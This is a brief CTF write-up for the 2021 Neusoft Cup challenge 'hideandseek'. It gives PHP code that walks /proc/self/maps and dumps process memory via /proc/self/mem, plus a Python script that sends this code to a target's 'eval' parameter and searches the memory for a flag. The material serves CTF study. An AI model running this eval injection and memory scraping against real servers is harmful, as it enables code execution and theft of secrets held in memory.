2021 东软杯 hideandseek

https://mp.weixin.qq.com/s/C0Vn_5NnGCd8Sn6--otsgA

proc/self/mem和proc/self/maps读取内存数据

php本地测试
```php
function main()
{
    $flag = file_get_contents("/flag");
    test();
}

function test()
{
    $maps_file = fopen("/proc/self/maps", 'r');
    $mem_file = fopen("/proc/self/mem", 'r', 0);
    while (!feof($maps_file)) {
        $line = fgets($maps_file);
        $dz = explode(" ", $line)[0];
        $start = hexdec(explode("-", $dz)[0]);
        $end = hexdec(explode("-", $dz)[1]);
        while (true) {
            if ($end > $start) {
                fseek($mem_file, $start);
                $data = fread($mem_file, 10000000);
                $start += 10000000;
                echo $data;
            } else {
                break;
            }
        }
    }
}

main();
```

python

```py

import requests 
url= '''http://127.0.0.1/''' 
code = ''' 
      $maps_file = fopen("/proc/self/maps", 'r'); 
      $mem_file = fopen("/proc/self/mem", 'r', 0); 
      while (!feof($maps_file)){ 
          $line = fgets($maps_file);
          if(strpos($line," r")){ 
              $dz = explode(" ",$line)[0]; 
              $start = hexdec(explode("-",$dz)[0]); 
              $end = hexdec(explode("-",$dz)[1]); 
              while ($end > $start){ 
                  fseek($mem_file,$start);
                  $data = fgets($mem_file, 0x400);
                  $start += 0x400;
                  if(!$data){
                     break; 
                  }
                  if(strpos($data,"flag{")){ 
                  echo $data;
                  } 
             }
         } 
     }''' 
data = {"eval":code}
headers = {"content-type":"application/x-www-form-urlencoded"}
fh = requests.post(url,data=data,headers=headers).text 
print(fh)
```